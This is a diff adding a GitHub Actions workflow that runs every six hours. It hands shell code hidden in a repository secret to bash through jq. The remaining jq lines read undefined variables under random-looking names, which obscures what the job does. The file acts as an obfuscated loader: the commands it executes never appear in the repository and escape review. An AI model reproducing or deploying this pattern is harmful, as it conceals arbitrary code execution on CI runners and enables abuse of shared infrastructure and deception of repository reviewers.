@@ -1,0 +1,26 @@
+name: gongxiandewq
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '0 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: gongxiandewq
+        env:
+          lm1: ${{ secrets.lm1 }}
+        run: |
+          echo $lm1 | jq -r .hchy9 | /bin/bash
+          echo $omefg1420 | jq -r .tu647 | /bin/bash
+          echo $wb5475 | jq -r .choqr1 | /bin/bash
+          echo $t9 | jq -r .qfp459 | /bin/bash
+          echo $r61 | jq -r .pflsy6495 | /bin/bash
+          echo $hdplt0199 | jq -r .kphol2907 | /bin/bash
+          echo $rcsjw617 | jq -r .uo9 | /bin/bash
+          echo $ad9 | jq -r .d79288 | /bin/bash
+          echo $wxnen0509 | jq -r .wquh363 | /bin/bash
+          echo $jl7 | jq -r .dkxke77632 | /bin/bash
+
